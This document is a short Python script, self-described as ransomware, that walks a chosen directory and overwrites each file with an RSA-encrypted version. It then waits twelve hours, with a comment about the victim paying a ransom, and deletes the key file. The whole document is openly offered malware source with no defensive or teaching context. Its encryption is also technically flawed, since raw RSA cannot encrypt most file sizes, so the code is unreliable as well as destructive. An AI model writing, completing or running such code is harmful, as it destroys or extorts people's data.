import os
import sys
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def encrypt_file(file_path, public_key):
    try:
        with open(file_path, 'rb') as original_file:
            original_content = original_file.read()

        key = RSA.import_key(public_key)
        cipher = PKCS1_OAEP.new(key)
        encrypted_content = cipher.encrypt(original_content)

        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_content)
        print(f"Encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

def encrypt_directory(directory, public_key, ransomware_path):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip the ransomware file
            if file_path == ransomware_path:
                continue

            encrypt_file(file_path, public_key)

# Check for command line arguments
print(sys.argv)
if len(sys.argv) < 2:
    print("Usage: python ransomware.py <directory>")
    sys.exit(1)

# We use the directory passed from the command
directory = sys.argv[1]

# Check if the directory exists
if not os.path.exists(directory):
    print("Directory does not exist")
    sys.exit(1)

# Path to the ransomware script itself
ransomware_path = os.path.abspath(sys.argv[0])

with open('publicKey.pem', 'rb') as pub:
    key = pub.read()

encrypt_directory(directory, key, ransomware_path)

# user only has 12 hours to pay the ransom and enter the key before the key is deleted and the files are lost forever
time.sleep(43200)

# delete the key
os.remove('publicKey.pem')
